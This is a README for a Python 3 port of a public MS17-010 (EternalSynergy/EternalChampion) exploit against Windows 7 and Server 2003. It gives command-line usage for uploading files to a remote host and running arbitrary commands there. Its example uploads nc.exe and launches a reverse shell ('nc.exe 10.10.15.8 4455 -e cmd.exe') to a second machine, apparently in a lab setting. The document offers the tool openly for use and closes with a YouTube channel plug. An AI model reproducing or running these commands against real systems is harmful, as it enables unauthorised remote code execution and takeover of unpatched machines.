This is a python3 implementation from the zzz_exploit. (https://github.com/worawit/MS17-010)

Original exploit was based on eternal sinergy and eternal champion. This is a partially translation to python3, with the "mysmb.py" included.

Tested in windows 7 and windows server 2003. Other Operative Systems may require to finish the translation to python3.

usage: 
   python3 eternal.py -i <remote ip> -t <file to transfer> -o <output file name>
   python3 eternal.py -i <remote ip> -c <rce to execute>

 NOTE: files transfered will appear inside remote host like c:\<output file name>

example usage: python3 eternal.py -i 10.10.10.40 -t nc.exe -o nc.exe -c 'c:/nc.exe 10.10.15.8 4455 -e cmd.exe'

If this exploit was usefull to you remember to subscribe to my youtube channel -> https://www.youtube.com/@artes_oscuras
